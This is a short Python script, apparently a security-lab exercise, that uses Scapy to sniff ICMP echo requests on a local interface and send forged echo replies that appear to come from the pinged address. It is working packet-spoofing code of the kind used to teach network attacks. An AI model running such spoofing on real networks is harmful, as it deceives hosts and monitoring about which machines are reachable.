from scapy.all import *
from scapy.layers.inet import IP, ICMP

lastid = "0.0.0.0"

def getPkt(pack):

    global lastid
    if pack[ICMP].type == 8:
        # create a spoofed ip with src and dst ip's from packet captured
        src = pack[IP].dst
        dst = pack[IP].src
        ihl = pack[IP].ihl
        # create a icmp header with id and seq of request.

        type = 0
        seq = pack[ICMP].seq
        id = pack[ICMP].id

        # copy load from old packet
        data = pack[Raw].load

        spoofed_pkt = IP(src=src, dst=dst, ihl=ihl) / ICMP(type=type, seq=seq, id=id) / data
        send(spoofed_pkt, verbose=0)
        if not lastid == src:
            print(f"Sent spoofed packet from {src} to {dst}.")

        lastid = src


pkt = sniff(iface='enp0s3', filter='icmp', prn=getPkt)